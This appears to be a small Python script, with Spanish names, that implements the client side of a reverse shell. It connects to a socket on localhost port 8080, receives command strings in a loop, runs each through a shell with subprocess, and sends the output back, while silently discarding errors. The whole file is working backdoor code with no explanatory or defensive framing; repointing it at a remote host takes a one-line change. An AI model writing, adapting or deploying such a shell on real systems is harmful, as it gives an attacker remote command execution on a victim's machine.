import socket
import subprocess

def coneccionCliente():

    cliente = socket.socket()
    try:
        cliente.connect(('localhost', 8080))
        cliente.send("1".encode("ascii"))
        while True:
            comandoBytes=cliente.recv(1024)
            comandoCodificado=comandoBytes.decode("ascii")

            comando = subprocess.Popen(comandoCodificado, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = comando.communicate()
            resultado = stdout + stderr
            cliente.send(resultado)
        
    except:
        pass

def main():
    coneccionCliente()


if __name__== '__main__':

    try:
        print('ejecutndo')
        main()

    except KeyboardInterrupt:
            print('El programa ha sido cancelado por el usuario cliente')
